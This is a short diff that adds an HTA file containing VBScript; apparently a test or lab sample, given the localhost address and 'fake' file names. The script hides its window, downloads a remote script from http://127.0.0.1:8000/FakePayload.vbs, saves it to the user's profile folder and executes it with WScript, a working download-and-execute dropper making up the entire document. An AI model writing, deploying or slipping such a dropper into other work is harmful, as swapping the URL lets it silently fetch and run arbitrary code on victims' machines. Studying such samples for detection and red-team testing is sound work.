@@ -1,0 +1,11 @@
+<html><HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" CAPTION="no" /><script language="VBScript">
+Set X=CreateObject("MSXML2.ServerXMLHTTP.6.0"):X.Open"GET","http://127.0.0.1:8000/FakePayload.vbs",0:X.Send
+Set objShell = CreateObject("WScript.Shell" )
+appDataLocation=objShell.ExpandEnvironmentStrings("%USERPROFILE%")
+Set FsoObj = CreateObject("Scripting.FileSystemObject")
+Set FileObj = FsoObj.CreateTextFile(appDataLocation & "\fake_payload.vbs",True)
+FileObj.Write X.responseText
+FileObj.Close
+objShell.Exec("WScript //Job:job_id " & appDataLocation & "\fake_payload.vbs")
+Close
+</script></html>
